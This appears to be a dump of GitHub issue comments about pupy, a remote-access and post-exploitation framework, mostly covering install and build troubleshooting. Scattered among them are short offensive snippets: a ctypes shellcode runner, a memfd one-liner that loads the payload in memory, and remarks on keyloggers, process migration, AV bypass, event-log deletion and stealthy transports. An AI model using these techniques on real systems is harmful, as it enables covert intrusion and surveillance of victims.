run python pupysh.py\nHowever, running info results in [ - ] no clients currently connected, and running\nconnect --host MYIPADDRESS:443 results in timeout.\nAm I doing something wrong? Am I supposed to do something with the payload.ps1 file? Right now I just placed it on the Desktop and did nothing with it\n\nYou made my day :)\n. You can find more information about your problem here, here and here\n. yep, try without the --depth 1. I added this option for the payload_templates to avoid downloading the full bin diff which can be quite big, but it break other packages when the commit is not on the HEAD. The option it's not mandatory if you are patient ;)\n. wiki updated\n. python\nfrom ctypes import *\ndef exec_shellcode_linux(shellcode):\n    b=create_string_buffer(shellcode, len(shellcode))\n    call = cast(b, CFUNCTYPE(c_void_p))\n    call()\n. it works but some modules throw an exception, there is still a problem with pyjnius on android 6.x, the template probably needs an update, I will investigate later\n. I think there may be a problem with Invoke-ReflectivePEInjection.ps1 :/ The powershell process needs too much memory and it doesn't work on machines with lower RAM capacity.\nI attempted to reduce the memory used by calling the powershell garbage collector (https://github.com/n1nj4sec/pupy/commit/be6c0e20d9004c6831d3bf183caa085d780782b1) but it's still not really effective and the powershell process always takes hundreds of MB or RAM and I don't understand where it comes from. It looks like byte buffers in powershell takes a lot more memory than the actual data they contain ...\n. Yep, I was on kali when I compiled the apk, so you need root to untar.\nAnother solution is to recompile the apk from sources\n. it's a warning in case you use scramblesuit transport that needs the pyyaml package\n. You need to generate the payloads again using the last templates, if you\nuse an old payload generated by an old version, it won't work with the last\nversion of the server\n. yup\n. Ok for the ismodule attribute, this is a good idea I will look into it\n. don't use python eggs, it's not supported\n. unzip rsa-3.4.2-py2.7.egg to /usr/local/lib/python2.7/dist-packages/rsa\n. The rpyc install probably failed, try to open a shell and to type : \npython -c \"import rpyc\"\nthe restricted function does exists in the last rpyc package, so if the last command didn't raise ImportError try that https://github.com/tomerfiliba/rpyc/blob/master/rpyc/utils/helpers.py#L48 \n. don't use eggs, eggs are not supported, so unzip them\n. unzip and obviously remove the .egg\n. git submodule init\ngit submodule update\n. duplicate issue #211\n. wow it shouldn't go over 10MB ! try to unzip them to understand what is happening. I close this issue but you can open a new one if your problem persist. Yes, I just fixed it, NPcap changed their install repository from windows\\system32 to windows\\system32\\NPcap and winpcapy couldn't find Packet.dll and wpcap.dll on the system\n. yes, _memimporter is builtin into both linux and windows payloads and allow to load .pyd/.so from memory. It is however unavailable for pure python files. I guess we could build it as a .so and drop it on disk in case of .py payload but the must would be to rewrite it using ctypes as it would be totally stealth :)\n. what is etree and where did you grab it ? I can't find it on pypi nor my package manager\n. If you imported it like in your example, i guess the directory is not used\nAnd since a recent commit you don't even have to put standard libraries in the packages/ directory, pupy load_packages() function can grab them from your server's python path automatically if not found in the packages/ repository\n. tell me if I'm wrong, but I think this is merged ?\n. it looks good don't hesitate to make a pull request when you have something more or less stable I can look at :) good job\n. hello, \nDon't edit pupy.conf and let the default ipv6 address :: which is the equivalent of 0.0.0.0 in ipv6. The port will be reachable from both your ipv4 and ipv6 address. If you wish to drop the ipv6 support and bind on a ipv4 address anyway, set ipv6=false in the config\n. yup, I did not took the time to install an old 32bit linux distrib to pre-compile the binaries. In the meantime you can compile them yourself or wait an undefined amount of time ;)\n. duplicate #206 \n. duplicate issue #211 \n. FYI copying /usr/lib/python2.7/ntpath.py to packages/all is not necessary, pupy can fetch it in /usr/lib/python2.7 if necessary\n. yep thx, I forgot the compatibility tag on this, the keylogger is only implemented for linux && windows\n. @ArThoX you know if you have access to a mac, it would be dead easy to create a keylogger module for mac taking example on a script like https://github.com/justicesuh/python-keylogger/blob/master/keylogger.py and the module https://github.com/n1nj4sec/pupy/blob/master/pupy/packages/linux/all/keylogger.py or https://github.com/n1nj4sec/pupy/blob/master/pupy/packages/windows/all/pupwinutils/keylogger.py\n. yup, you need to recompile the apk for your architecture\n. You probably can't, from kivy documentation (https://kivy.org/docs/guide/android.html) : \n```\nThese sections previously described the existence of Kivy\u2019s Android build tools, with their limitations and some devices that were known to work.\nThe Android tools are now quite stable, and should work with practically any device; our minimum requirements are OpenGL ES 2.0 and Android 2.2. These are very common now - Kivy has even been run on an Android smartwatch!\nA current technical limitation is that the Android build tools compile only ARM APKs, which will not run on Android devices with x86 processors (these are currently rare). This should be added soon.\nAs Kivy works fine on most devices, the list of supported phones/tablets has been retired - all Android devices are likely to work if they meet the conditions above.\nThe good news is that pupy probably works on android smartwatch :)\nFor testing, if you don't want to test on a physical phone, you can try with google's avd. si\n. Thank you I will have a look. FYI UDP transport worked but as a poc because a single packet loss breaked the connection and the async transports also worked. The code seemed not used because I remove the transports config from network/transport/xxx/conf.py to avoid noobies posting issues about it beeing slow and unstable ;)\n. thx @nyrewan I managed to make udp work again as poc but retransmission still needs to be taken care of\n. btw @alxchk I just tried the winpty shell, and it's awesome ! GJ :)\n. haha and deleting event logs on windows is stealthier ? :p \nedit: and (un)?fortunately it let an eventid 104 \"system logs cleared\"\n.\nman git\n. follow the wiki\n. hmm strange, the commit exists https://github.com/CoreSecurity/impacket/commit/f35117e184438e747c0ba372ea3ef8f41d9a5d73\nI just tried to reclone the repo and it seems to work\nedit: the error might be from the --depth 1 option (if you used it ?), I removed it from the wiki because each time the HEAD of a submodule move, we can't fetch older records\n. you forgot the wdigest package :)\n. thx, it's fixed it was just a missing symlink to import some dependencies on android. try to run it using python 2.7. the problem is probably that you need to write \"y\"\ntry removing \"2>&1 > /dev/null\" line 7 of build.sh. gj ! :). what is the problem with the symbolic link here https://github.com/n1nj4sec/pupy/blob/master/pupy/packages/android/ptyshell.py, why did you paste ptyshell instead ?. probably, I tested it on android 5.1 and 6.0 and it works great. You should look at logcat output for debug. wooot nice ! :D. I return you the question. what's wrong with this?. edit buildozer.spec and recompile the apk. This can be for two reasons. \nThe first is that one of the submodule's owner rebased their whole project and commits number doesn't exist anymore. \nIt is not the case, because as you can see https://github.com/AlessandroZ/LaZagne/commit/3135aefe986d2a411309022039b931f2a45936ea is available\nThe second reason is that there is something wrong with your git installation, you probably used the --depth option on one of the submodule in the past, and now you can't find the good version after a pull.\nTry to remove everything and reinstall from the start\nIf it does not fix the problem, use the following command :bash\nman git \nas suggested in issue #239 by alxchk, it could come from your git version. I don't have the issue everything is running fine with my conf\nYou probably have a shallow issue, try to change the \"git submodule init\" with a big depth like --depth 1000. since git 2.9.0 there is also the --shallow-submodules option which looks nice. So perhaps the easiest would be to try :\ngit clone --shallow-submodules --recursive https://github.com/n1nj4sec/pupy.git\ncd pupy\npip install -r requirements.txt\ntell me if that worked so I can edit the wiki. submodule not updated. fixed in https://github.com/n1nj4sec/pupy/commit/f3fc9a5fca1b4e09a41c2bfe62bf03491d210447. You can dispatch your exceptions elsewhere\nFix me if I'm wrong. And FYI, the new line is here because in some cases it doesn't work without on compiled code\nhttps://docs.python.org/2/library/functions.html#compile\nNote\nWhen compiling a string with multi-line code in 'single' or 'eval' mode, input must be terminated by at least one newline character. This is to facilitate detection of incomplete and complete statements in the code module. \n. yup. it's not meant to be called directly. :o). problem between the keyboard and the chair. Could you try again after my last commit ? thx. This is already supported thank's to @alxchk work (on linux python dynamic libraries are not renamed .pyd but stays named .so)\nhttps://github.com/n1nj4sec/pupy/blob/master/client/sources-linux/_memimporter.c. omg this memfd technique is awesome ! it looks like we have a new oneliner for linux :)python\nimport os\nfrom ctypes import *\nc = CDLL(\"libc.so.6\")\nfd = c.syscall(319,\"plop\",0)\nos.write(fd,open(\"pupy.so\",\"rb\").read())\nCDLL(\"/proc/self/fd/%s\"%fd)\n. This section of wiki was deprecated, I updated it. You can now crosscompile with wine using :\n./buildenv.sh #will install all the dependencies\n./build.sh #will build the payloads\n. you need a buildozer.spec. No I didn't plan to do this any time soon, but you are welcome to make a contribution ! Be aware that api for some functionalities will be hard to implement (for instance interactive modules). you can start working on it !\nunless I win the lottery and I have too much free time, I won't find time to work on this before approximately year 2032 ;)\nIf I acknowledge it doesn't mean I will work on it, it means it's a good idea. well, feel free to start working on this and send PR. awesome ! :-). try using the py format instead of lin_x64 in the meantime I review/merge alxchk work on this. use python 2.7, not python 3, I will add a warning concerning the version 3. the standard method is now to crosscompile with wine https://github.com/n1nj4sec/pupy/wiki/Build-payloads-from-sources. try to debug withadb logcat. I have trouble making this work, it seems your fork is broken\n========= Remote Traceback (1) =========\nTraceback (most recent call last):\n  File \"C:\\Python27\\Lib\\site-packages\\rpyc\\core\\protocol.py\", line 305, in _dispatch_request\n  File \"C:\\Python27\\Lib\\site-packages\\rpyc\\core\\protocol.py\", line 535, in _handle_call\n  File \"changeme/core.py\", line 101, in run_changeme\n  File \"changeme/scan_engine.py\", line 16, in scan\n  File \"changeme/scanners/http.py\", line 73, in scan\nNameError: global name 'fp' is not defined\nI also tried the ztgrace master but I have tons of errors :/. check if there is any error when running buildenv, it seems cl.sh doesn't exists, so your buildenv didn't succeeded. I just tried a bind payload on linux && windows, it works fine\n\n\nconnect --host 127.0.0.1:1234 -t ssl\n[%] Connecting ...\n[] Session 1 opened (0.0.0.0:1234 <- 0.0.0.0:0)\nconnect --host 192.168.58.152:1234 -t ssl\n[%] Connecting ...\n[] Session 2 opened (0.0.0.0:1234 <- 0.0.0.0:0)\n. I merged this on the unstable branch, but the wmi persistence doesn't seems to work on neither my windows 7 nor my windows 10. I can't find anything really useful in windows eventlogs, do you know how can I debug this ?. ok thank's it works now, there was an issue with the --exe arg. well, most of them are pretty obvious :-)\nsome of them are really hard to implement for us. In particular memset to 0 old buffers, because python and the garbage collector handle the memory as it wishes :/. is \"socketserver\" SocketServer from python std lib ?\nfrom Traceback (most recent call last):\n  File \"./pupysh.py\", line 36, in \n    from pupylib import PupyServer\n  File \"/home/me/partage/pupy/pupy/pupylib/init.py\", line 7, in \n    from PupyDnsCnc import \n  File \"/home/me/partage/pupy/pupy/pupylib/PupyDnsCnc.py\", line 4, in \n    from network.lib.picocmd.server import \n  File \"/home/me/partage/pupy/pupy/network/lib/picocmd/server.py\", line 17, in \n    import socketserver\nImportError: No module named socketserver\n. ok, my python \"future\" package wasn't up-to-date. Could you push you next commits to the \"unstable\" branch ? thx :)\nhttps://github.com/n1nj4sec/pupy/tree/unstable. I meant pull request to my unstable branch not push sry !. you can blame google for that ;) https://developer.android.com/reference/android/speech/tts/TextToSpeech.html. You have to know your language or implement getAvailableLanguages() from the link I gave you. The code you have to edit is https://github.com/n1nj4sec/pupy/blob/master/pupy/packages/android/pupydroid/text_to_speech.py\nI accept Pull Requests, thx :). merged. well, I guess you did something else wrong ! try to useadb logcatto debug. IDK, it looks like you have multiple problems: missing some .so and you can't load some resources :\n 03-14 16:38:40.670 E/art (21547): dlopen(\"/data/data/org.pupy.android/files/lib/python2.7/lib-dynload/_sqlite3.so\", RTLD_LAZY) failed: dlopen failed: library \"/data/data/org.pupy.android/files/lib/python2.7/lib-dynload/_sqlite3.so\" not found\n03-14 16:38:40.671 E/art (21547): dlopen(\"/data/data/org.pupy.android/files/lib/python2.7/lib-dynload/_imaging.so\", RTLD_LAZY) failed: dlopen failed: library \"/data/data/org.pupy.android/files/lib/python2.7/lib-dynload/_imaging.so\" not found\nFailure retrieving resources for org.pupy.android: Resource ID #0x0\nobvious solution : compile the .so and embed the missing resource. The problem here is with cryptography, not pupy ! it seams you are missing some openssl headers to compile cryptography, go on the cryptography project and read install instructions or do as usual, don't even bother read the stack trace and open an issue on their github. But hey, before you do, don't look at other closed issues, it's not like the problem can be resolved by googling it ! https://github.com/pyca/cryptography/issues/3178. Thx it's always nice to have !. Nice thx ! \nFor the sdctl.exe, perhaps you can access it from a 32 bit process using the path: C:\\Windows\\SysNative\\sdctl.exe ? (it should bypass the system32/sysWOW64 windows redirection). are you running the payload on mac or pupysh ? The payload works on mac, pupysh on mac should work but is not really tested. If you don't have any errors, check your firewall rules, start tcpdump and see what happens. try upgrading pip and/or reinstalling pip, it seems broken. not planned but everything is possible, If you wish to make it I will gladly accept PR :). Too complicated there are other ways to bypass AV. For the stub size, @alxchk made it awesomely small check out the unstable branch, the PE size has been smashed to 3.2 MB. It has been merged into the unstable branch but not the master yet https://github.com/n1nj4sec/pupy/commit/2255a5af47f987e287a585b517dfe60494ac69f1\nYou didn't saw the error because now in the new version if a package is missing from the remote python interpreter, it can be asked to pupy server and pushed automatically. But it's still slower than putting it in the dependency list because it has to make multiple network calls each time a package is not found remotely.\nto understand what I mean you can start pupysh with --log-level DEBUG\nrun pyshell\n\nimport impacket\nprint impacket\n```\nyou will see that you can import impacket transparently on a client if you have it installed on the server ! :smile: . https://github.com/n1nj4sec/pupy/wiki/Setting-up-the-server. could you try with the last version ? there has been a lot of changes. nop ! it's actually a script kiddie protection feature integrated in pupy. 25Mo of RAM is not that bad is it ? :) \n\n\n\npupy can run without pycrypto (there is a lightweight, pure python replacement in lib/transports/cryptoutils/pyaes/) that can be used if pycrypto is missing for all transports using AES (but it's slower).\nOne of the main problem is that a lot of modules uses different crypto libraries (lazagne, scapy, impacket, etc ...).\nBut I agree we should use only one crypto library at least for pupy internals. I don't know pycryptodome but it seems they only make bugfix releases and cryptography is more famous so I think we should go for cryptography but perhaps you have arguments to go the other way ?\nNB: scapy switched from pycrypto to cryptography a few month ago https://github.com/secdev/scapy/pull/371\nFor yaml I agree it's totally useless (It's here only because scramblesuit (from tor obfsproxy project) uses it)\nSame for OpenSSL, pupy network transports doesn't need it it's only some external modules :/\nIn general,  we should try to avoid using external libraries as much as possible when it's easily feasible using ctypes with reasonable performances ( like in memorpy to answer your python-ptrace question ;))\nPerhaps a solution would be to put a mechanism in place to unload some python modules after pupy's module finished ? idk if cleaning sys.modules[module] and call gc.collect() would be enought to free some RAM\n. Yup I saw what you did but you only freed pupyimporter.modules, I just asked if you could imagine a way to free sys.modules by finding a trick or manipulating python internals \nExample : you create a module bigfile.py containing \npython\nA=\"a\"*30*10**6\nthen if you import bigfile your process is 30MB larger and you can't free it ! Then you can try to \nimport bigfile\ndel sys.modules['bigfile']\ndel bigfile\nwith open(\"bigfile.py\",'w') as w:\n    w.write(\"\")\noldbigfile=bigfile\nreload(bigfile)\ndel oldbigfile\nimport gc\ngc.collect()\nNothing works, we can't free the module it just seems python can't natively \"unload\" a module :/. Ok, I found a way, here is the idea :)\n```python\nimport bigfile\nfrom ctypes import *\n_PyModule_Clear=pythonapi._PyModule_Clear\n_PyModule_Clear.restype = None\n_PyModule_Clear.argtypes = [ py_object ]\n_PyModule_Clear(bigfile)\nthis actually free the memory and reduces the process RAM consumption. offer me an iphone and I will definitively work on this ;). http://bfy.tw/4wGy. Please try to open a python shell and bind a socket on your public IP. If you can't, go report this on python.org. I bet the problem is either in python or between your seat and your keyboard. cf https://github.com/n1nj4sec/pupy/issues/152. your link does exactly the same, it uses a shellcode to download a patched dll from a http server and load it in memory. You can use the same shellcode with pupy's dll (patched with reflectPatcher.py) and it should work. I confirm it's working with @alxchk patch if you recompile the templates (I only push them to the pupy-binaries repository for the master branch)\n![screenshot from 2017-04-21 18-34-39](https://cloud.githubusercontent.com/assets/12549318/25287452/a1e46908-26c1-11e7-9079-a22abd632906.png)\n.pip install -r requirements.txt. You probably made a mistake again. Because I don't have a 0day on nautilus and your question is not pupy related. . I added the gnome-keyring feature to avoid retyping my credentials every time and still have the credentials encrypted ! I know the creds are easily retrievable with laZagne but it's still better than cleartext ;). yup, agreed. read the error, use your brain, and understand what's wrong. Everything is written and the error message even suggest you a valid list of arguments ! I think at this point nobody can help you if you can't help yourself. It works, it's just there is no 404 returned in case the path is unknown and it returns a ssl error.\ntry : curl -v -k https://x.x.x.x:xxxx/eiloShaegae1 And @AlessandroZ  I have no issue for the oneliner without the quotes (I tried in both the run prompt and a cmd.exe). wow @alxchk your idea of having the httpwrapper transport layer on the server side only is awesome ! At first quick review I thought it was a remake of the http transport with an option to wrap any other transport within, but it's actually not it's a server layer to support http and an additional pupy transport ! (but of course not http)\nThe only thing bad that I see could happen is having a stream starting with GET/POST/HEAD, when you use crypto and have random data you may be unlucky \\o/ ^^. merged into unstable. 703e8a173507bdde4b6adf84f454a7633c47ff29. use this instead:run migrate -k -c notepad.pip install Pillow.bash\ncd client/sources\n./buildenv.sh\n./build.sh\n. Try :\nrm crypto/credentials.py\nAnd restart pupysh.py to regenerate the file. if there is no exception and the payload is well created, it's a standard message to warn you about the credentials it will embed in the payload, it's not an error. it starts with a [+] not a [-] so you can ignore it. merged into unstable. Your password is incorrect, enter the same password as the first time you generated the file. merged into unstable. socketserver is an alias for SocketServer but compatible with python3. The alias is installed with the \"future\" package when you install all dependencies in the requirements.txt. you don't need to call anything except MemoryLoadLibrary follower by while(1){Sleep(10000);} (because pupy's DLL creates a new thread and you don't want your main thread to exit.) You probably also want to rethink what sizeof actually do, but I let you figure it out. try again, it should be fixed (there is still and issue with stdout flush, so spam enter and it should work). Could you try again to see if the problem still persist ? if it does try the rsa transport to see if it's only ssl related. fixed. it's your password defined at install. There is plenty of projects on github showing how to do it in java.\nYou are welcome to implement this using jnius autoclass like here https://github.com/n1nj4sec/pupy/blob/master/pupy/packages/android/pupydroid/camera.py and make a contribution to the project. merged into unstable. merged into unstable. scapy issue.pip install requests. platform is python standard library, please do not remove python standard library files. it's not meant to be run directly, try ./pupysh.py --web\nFYI, it's just a poc, of how I would plug a web interface on pupy in case someone want to do so. one of the pip dependency have failed, try pip install -r requirements.txt again. try pip install future ```. merged into unstable. I already tried it some times ago and it worked. I wrote the http_async transport for that, but it might be broken since. Hello ! \nSry I may have missed your message, yes it looks nice but I don't see the problem with the current reconnect pattern and a configurable reconnect pattern seems overkill :). use the \"creds\" commands. only build with wine is officially supported. Thank you for the PR :). merged into unstable. I never had this issue, do you have a custom module named utils ?. yup all is working fine, refer to the wiki for the new syntax. your error is pretty self explanatory. that's the beauty of it, just install impacket on the server side and you can access it from all the clients. no sorry, storing an UUID on the disk does not match pupy's \"all in memory\" guideline. Hello Reilly !\nYou are welcome if you want to help building a GUI for pupy !\nSo I made an example a few times ago of how I would make a web interface with websockets interact with pupy (using tornado and angular). The code is available in the 'web' branch on the git https://github.com/n1nj4sec/pupy/tree/web\nYou can look in particular the directory pupy/websrv/* for the code which is pretty minimalist. the PupyWebServer class acts as a replacement for the command line class pupylib.PupyCmd.PupyCmd which interact with PupyServer. In my example you can start the web server with \"./pupysh.py --web\"\nThe code is just a PoC so you will need to merge or rewrite it from scrach from the master (or preferably the unstable branch). I used tornado and angular for the PoC but I'm not particularly familiar with them so you are welcome to use flask and VueJS as you wish ;)\nDon't hesitate if you have any questions,\nCya\n. I made a rdesktop module poc that stream the desktop and allow you to interact with mouse and keyboard through a local webserver with websockets. From there it shouldn't be difficult to modify to stream webcam or audio. is it fixed ?. show us both pupygen and pupysh commands you used. do not call your payload pupy.py. To debug android apk look at adb logs. pupygen.py -h. yep that's the command ! next step involves reading the output. look at the travis-ci build, if it can build it from sources, you can. if you have time to code that, PR are welcome, in the meantime I close the issue cause it's not something I want to spend time on. It should be fixed, could you retry please ? the DLL spawned pupy in a new thread that's why it worked inside a shell and not with -c arguments because powershell exited just after. try to remove or rename /root/pupy/pupy/pupylib/../crypto/credentials.py and restart pupysh. I have never done it but yes it should be possible it's just python bytecode compressed with lzma embedded in the dll.\n1. Search at the offset of this string (https://github.com/n1nj4sec/pupy/blob/unstable/client/sources/pupy.c#L23) (you can approximately find the offset by searching in the template but it may vary)\n2. Decompress the bytecode using lzma https://github.com/n1nj4sec/pupy/blob/unstable/client/sources/pupy.c#L63\n3. write the python bytecode to a .pyc file and decompile it (using some tool like uncompyle)\n. feel free to make a PR :o) make it deactivable via pupy.conf. No, you probably have a network issue. try connect instead of auto_proxy. run forward --help. rtfm. try to increase ulimit. Hey,\nWhat do you have in mind exactly ? I doubt you need to change the main, but here it is : \nbash\n$ find client/sources | egrep -e 'main.*\\.c$'\nclient/sources/main_reflective.c\nclient/sources/main_exe.c\nSorry for the Doc there is not ! but the C code is pretty small and concise ;). unzip the .egg and rename \"rsa-3.4.2-py2.7\" to \"rsa\". yup I added back the old portfwd/socks5proxy modules in case pyuv is not available. Thank you that's a very neat commit :). try to download the templates again, they are available in the txz. try to remove pycrypto and install pycryptodome (https://github.com/Legrandin/pycryptodome). If it does not work, you can still totally remove pycrypto as it is not a necessary dependency and pupy will automatically use an alternate method for AES .... look at the [on_connect] section in pupy.conf. Memory execution needs to load a pyd. pyd currently cannot be loaded using pure python code, so use the exe template and it will work ;). install jarsigner. pupysh.py -h\n...\n  -S, --shared          Create shared object\n.... nice :) I will test your PR soon ;) The project is not dead, I just don't have much time to work on it. . install requirements. The problem is that new openssl versions don't accept rsa keys <2048 and pupy default's ssl certificate is generated using rsa 1024.\n2018-11-06 11:06:22,087| AuthenticationError: [SSL: EE_KEY_TOO_SMALL] ee key too small (_ssl.c:2779)\nI can't make a pull request right now, but you can change the size here https://github.com/n1nj4sec/pupy/blob/unstable/pupy/pupylib/PupyCredentials.py#L195 to fix the problem and re-generate SSL keys. . Hey guys !\nI didn't got married but I do have a girlfriend and a life ;)\nI don't have much free time to work on pupy and even less to read issues and answer to everyone.\nHowever, I do use pupy at work when I have the occasion depending on the perimeter of the pentest I perform. During worktime I don't usually have time to improve pupy and I just \"make things work\" when I need them or find workarounds. The development in on hold for now but I count re-start working on it !\nBut seeing their good job and their implication if they agree I could add @alxchk and @AlessandroZ as collaborators of the project so we can all manage issues and merge pull requests on pupy. I could also make the master branch protected to force multiple people to review the code before merging our pull requests, so we can have a more stable code. What do you think ?\nCya,\nNicolas. Docker is fine but I don't think it should be the standard method for deploying pupy for multiple reasons : \n- I can't access/edit my source easily\n- And most of all, I can't make pull requests once I created a particular module for an engagement !\nThat's why I re-enabled the automatic travis build and added an option to automatically download latest templates from github releases.\nTo install pupy in a lightweight way, all you have to do is :\napt-get install git libssl1.0-dev libffi-dev python-dev python-pip tcpdump python-virtualenv\ngit clone --recursive https://github.com/n1nj4sec/pupy\ncd pupy\npython create-workspace.py -DG pupyw\nWhile the build toolchain using docker is very useful, I don't see any advantage of using docker for pupysh if it's not for a quick deploy in the cloud. The travis-ci build automatically everything and push all the compiled templates to https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz\n, so after each push on the unstable branch, if it builds without error, it's updated automatically and the new templates freshly compiled overwrite the old ones.\nVirtualenv is in my opinion the only way to install pupy properly, docker and/or docker-composer is overkill and won't work on every platform as you think it does. It only works on x86_64 unless you rebuild the container ... . that's not possible, they are most likely lost... unless you can trick the NTP or something ?. They are back if you want a lightweight install, use create-workspace.py -DG . If you don't want to rebuild your payloads, use -DG to avoid rebuilding everything. I told you my idea, you don't have enough memory to build, so don't build and user the -DG flag .... > Goddamn I hate this docker bullshit. The old pupy without docker was so much better.\nFeel free not to use it and to use the virtualenv install. To be honest, obfs3 or scramblesuit is not really useful in a real pentest scenario, I never had to use them and made them to work because it was fun and easy to integrate from Tor transports :) obfs4 is written in Go, so its not that easy to re-implement in pure python. I made an audio transport once that propagated from a computer to another via microphone and speakers but never published it because it was slooooow. Not really useful but still fun :) . Except my payload was emitting audible bips x). I can't find it I think it's on one of my raspberry SD card. Anyway it was just using some pyaudio recording and converted it to data. For the scrolling, as alxchk said, it is a \"feature\". You can enable the scrolling back with shadow_screen = no. ",
    "byt3bl33d3r": "@n1nj4sec cool np ;)\n. @0x27 I was actually just looking into this, unfortunately i don't see a simple way of implementing this since communication with the bots revolves around the rpyc library which only support SSL/TLS and SSH.\nI'm guessing we could somehow tunnel rpyc traffic through other protocols but it would require writing a lot of code server and client side, and might complicate things way too much. Would love to hear if @n1nj4sec has any idea on how to do this efficiently\n. @deathfantasy agreed, thats probably the best way to go about it\n. @deathfantasy that's really clever, will probably take a stab at implementing this today if it's ok with everybody\n. @n1nj4sec @0x27 Just tested @deathfantasy's idea of using obfsproxy and it works beautifully, better yet only two lines of code to tie us in! Just need to integrate obfsproxy and will send a PR later today! \\o/ \n. Ok so I encountered an initial problem when integrating obfsproxy, after adding the required deps to the libraryx*.zip files so we can have it built into the payloads the resulting size is too big (33MB), so I'm currently trying to see if I can rip out the client part of obfsproxy and just add that in. fingers crossed \n. @deathfantasy yep I was just about to start doing that actually :+1: \n. Ok I got twisted down to 3.1 MB (I could slim that down even further i think)! Huzzah! the whole library   currently comes to a grand total of 18M which i still think is too big in my opinion\n108K    libraryx64/unittest\n20K libraryx64/pyptlib/util\n76K libraryx64/pyptlib\n12K libraryx64/xml/parsers\n20K libraryx64/xml\n52K libraryx64/json\n68K libraryx64/zope/interface/common\n308K    libraryx64/zope/interface\n312K    libraryx64/zope\n396K    libraryx64/pydoc_data\n552K    libraryx64/twisted/protocols\n728K    libraryx64/twisted/python\n124K    libraryx64/twisted/logger\n668K    libraryx64/twisted/web\n976K    libraryx64/twisted/internet\n3.1M    libraryx64/twisted\n76K libraryx64/rpyc/utils\n112K    libraryx64/rpyc/core\n24K libraryx64/rpyc/lib\n224K    libraryx64/rpyc\n8.0K    libraryx64/email/mime\n164K    libraryx64/email\n212K    libraryx64/yaml\n60K libraryx64/distutils\n40K libraryx64/pyreadline/keysyms\n60K libraryx64/pyreadline/lineeditor\n136K    libraryx64/pyreadline/modes\n48K libraryx64/pyreadline/console\n20K libraryx64/pyreadline/clipboard\n356K    libraryx64/pyreadline\n24K libraryx64/ctypes/macholib\n68K libraryx64/ctypes\n16K libraryx64/multiprocessing/dummy\n192K    libraryx64/multiprocessing\n100K    libraryx64/logging\n84K libraryx64/Crypto/Cipher\n200K    libraryx64/Crypto/Util\n36K libraryx64/Crypto/Protocol\n28K libraryx64/Crypto/Random/Fortuna\n24K libraryx64/Crypto/Random/OSRNG\n80K libraryx64/Crypto/Random\n96K libraryx64/Crypto/PublicKey\n56K libraryx64/Crypto/Hash\n28K libraryx64/Crypto/Signature\n592K    libraryx64/Crypto\n604K    libraryx64/encodings\n18M libraryx64\n. @deathfantasy Done! https://github.com/byt3bl33d3r/pupy-lib added you and @n1nj4sec  as collaborators so you can push directly\n. slimming is manual atm, once we have it nailed down it can be easily scripted\n. just to be clear ( I should have made this clearer earlier) the library is 18MB uncompressed, compressed its 6.4MB (vs the original 5.2MB ) \n. @shellster rpyc supports ssh out-of-the-box so that shouldn't be a problem ;)\n. @artagel that's related to #3 since the migrate module uses the psutils library\n. @artagel agreed, @n1nj4sec I think it would be best to make the pupy shell commands as close as possible to metasploit so that it's instantly familiar  to everyone (e.g. clients would be sessions etc...) \n. @artagel you can do run exit --yes to kill a client\n. @n1nj4sec lol, well you beat me to it, if you want me to delete the sessions stuff and just keep the notifications let me know\n. @n1nj4sec all set, good to go!\n. @n1nj4sec awesome ! \\o/\n. @n1nj4sec ahaha yeah that was bugging me too , will do some digging to see if it's possible.\nShould have a couple of more PR's coming your way ;)\n. @deathfantasy your seem to be missing the PyCrypt, Twisted, pyptlib and pyyaml libraries\n. @n1nj4sec yup totally get that just thought it would be a cool feature to have anyway, as for the manifest I wasn't aware of mt.exe will have to look into that\n. @amainyebriggs that's kinda the idea... it's meant to be injected into memory not dropped to disk...\n. ",
    "artagel": "Same here.\n. Running server on Kali 2.0, client on Windows 7 x86.\n. Dang, you're right..I'm too used to being on windows in meterpreter!\n. It does look like -f  will work.  But yes, I believe being more like meterpreter will lower the learning curve and let people transfer between frameworks easily.\n. That simply exits the entire server.  It doesn't specifically kill only one client.  If I have 10 clients calling back, I want to kill just one.  Also, when I restarted the server the session came back, so the client really didn't die.\n. Yes, I see didn't notice the run.  Yes, that works.\n. ",
    "0x27": "Well, it could be easier to just modify rpyc and ship a modified version as part of the codebase, than trying to tunnel it over other stuff?\nAfter all, SSH/SSL/TLS and all that just acts as a socket in the end, so we can probably just \"snip\" at some point. Then again, could be oversimplifying the problem :)\n. Was looking through the pile of \"stuff\", and this stuck out as interesting as potentially a source of ideas for alternative C&C channels.\nhttps://github.com/ytisf/PyExfil\nWill have to look into how rpyc actually works, see if extra \"channels\" can be trivially added to it :)\n. As much as I hate to promote projects I work on in other projects... Here's something that would be fairly cool to implement/add once we have a working release (soon!). This way you could have the C&C server as a Tor hidden service, or do it in reverse and have the pwned box spin up its own HS that the client connects to (kind of like a bindshell).\npycepa - Pure Python Tor Implementation\nAs per pycepa - Pure Python Tor Implementation/Issue 19, we actually intend to implement pluggable transport support using the extant pluggable transport framework (for compatibility with extant Torproject stuff) once we reach that goal (eventually.)\n. Beautiful work @byt3bl33d3r :D \n. Related (and now possible thanks to you guys being awesome): Now that obfsproxy/pluggable transport support is soon to be in place... An interesting avenue of development (that I intend to pursue) is \"Adversary Simulation\" ala the Cobalt Strike functionality. Probably the easiest way to do this (off the top of my head) is to simply write a pluggable transport module that does traffic like the thing I want to simulate/model or something.\n. I think this might help solve it, ran into this error in another project recently. Its to do with how WinSock handles things. Might need to patch rpyc accordingly, or monkeypatch the method in use.\n. See Issue#4 which encapsulates this. \nI am trying (mostly failing!) to write a DNS tunnelling client in Python at the moment for another project, which uses the Tor Pluggable Transport mechanism. Hopefully that works eventually and can fold that in on top of the extant rpyc/pluggable transport mechanisms proposed :)\n. ",
